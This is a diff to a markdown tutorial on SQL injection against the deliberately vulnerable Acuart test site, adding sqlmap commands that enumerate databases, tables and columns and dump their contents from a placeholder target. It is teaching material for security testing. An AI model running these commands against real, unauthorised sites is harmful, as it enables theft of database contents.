@@ -45,6 +45,28 @@ Acuart (http://testphp.vulnweb.com) is an intentionally vulnerable web applicati
 | `-C`         | Specifies the column name(s) from which data needs to be retrieved or exploited.                             |
 | `--dump`     | Command to extract and display the content of the specified column(s) from a table.                          |
 -------------------------------------------------------------------------------------------------------------------------------
+
+- Command to identify databases on the target server
+```bash
+sqlmap -u http://targetwebsite.com --dbs
+```
+
+- Command to enumerate tables in a specific database
+```bash
+sqlmap -u http://targetwebsite.com -D database_name --tables
+```
+
+
+- Command to list columns in a table
+```bash
+sqlmap -u http://targetwebsite.com -D database_name -T table_name --columns
+```
+
+- Command to extract data from a specific column in a table
+```bash
+sqlmap -u http://targetwebsite.com -D database_name -T table_name -C column_name --dump
+```
+
 ## 2. Identifying Vulnerable Parameters
 The first step in conducting SQL injection involves identifying vulnerable parameters within a web application.SQL injection vulnerabilities can be discover by testing the URL parameter `php?id=` to test for potential injection points.
 
